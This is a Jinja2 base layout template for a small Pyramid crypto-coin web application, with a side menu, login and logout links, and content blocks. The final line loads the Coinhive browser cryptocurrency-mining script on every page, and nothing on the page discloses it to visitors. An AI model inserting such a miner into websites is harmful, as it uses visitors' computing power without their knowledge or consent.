<!DOCTYPE html>
<html lang="{{request.locale_name}}">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="pyramid web application">
    <meta name="author" content="Alko89">
    <link rel="shortcut icon" href="{{request.static_url('cryptodokladi:static/pyramid-16x16.png')}}">

    <title>{% block subtitle %}{% endblock %}Kripto Kojn</title>

    <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css">
    
    <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-old-ie-min.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-min.css">
    <!--<![endif]-->
    
    
        <!--[if lte IE 8]>
            <link href="{{request.static_url('cryptodokladi:static/css/pure-layout/side-menu-old-ie.css')}}" rel="stylesheet">
        <![endif]-->
        <!--[if gt IE 8]><!-->
            <link href="{{request.static_url('cryptodokladi:static/css/pure-layout/side-menu.css')}}" rel="stylesheet">
        <!--<![endif]-->

</head>
<body>
<div id="layout">
    <!-- Menu toggle -->
    <a href="#menu" id="menuLink" class="menu-link">
        <!-- Hamburger icon -->
        <span></span>
    </a>

    <div id="menu">
        <div class="pure-menu">
            <a class="pure-menu-heading" href="#">GoOpen</a>

            <ul class="pure-menu-list">

                <li class="pure-menu-item pure-menu-selected">
                    <a class="pure-menu-link" href="{{request.route_url('view_page', pagename='FrontPage')}}">Home</a>
                </li>

                {% if request.user is not none %}
                    {% if request.user.role == "editor" %}
                    <li class="pure-menu-item">
                        <a class="pure-menu-link" href="{{request.route_url('user_list')}}">Seznam</a>
                    </li>
                    {% endif %}
                    <li class="pure-menu-item">
                        <a class="pure-menu-link" href="{{request.route_url('user_view', username=request.user.name)}}">Stanje</a>
                    </li>
                    {% block songnavigation %}{% endblock %}
                    <li class="pure-menu-item">
                        <a class="pure-menu-link" href="{{request.route_url('logout')}}">Logout</a>
                    </li>
                {% else %}
                    <li class="pure-menu-item">
                        <a class="pure-menu-link" href="{{request.route_url('login')}}">Login</a>
                    </li>
                {% endif %}

                <li class="pure-menu-item menu-item-divided">
                    <a class="pure-menu-link" href="{{request.route_url('view_page', pagename='About')}}">O nas</a>
                </li>
                
                <li class="pure-menu-item">
                    <a class="pure-menu-link" href="https://github.com/Alko89/cryptodokladi">GitHub</a>
                </li>
            </ul>
        </div>
    </div>

    <div id="main">
        <div class="header">
            <h1>Kripto Dokladi</h1>
            <h2>Trejdajne Kriptokojnu</h2>
        </div>

        <div class="content">
            {% block content %}{% endblock %}
        </div>
    </div>
</div>

<script src="{{request.static_url('cryptodokladi:static/js/ui.js')}}"></script>
<script src="{{request.static_url('cryptodokladi:static/js/jquery-3.2.1.min.js')}}"></script>
<script src="{{request.static_url('cryptodokladi:static/js/script.js')}}"></script>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
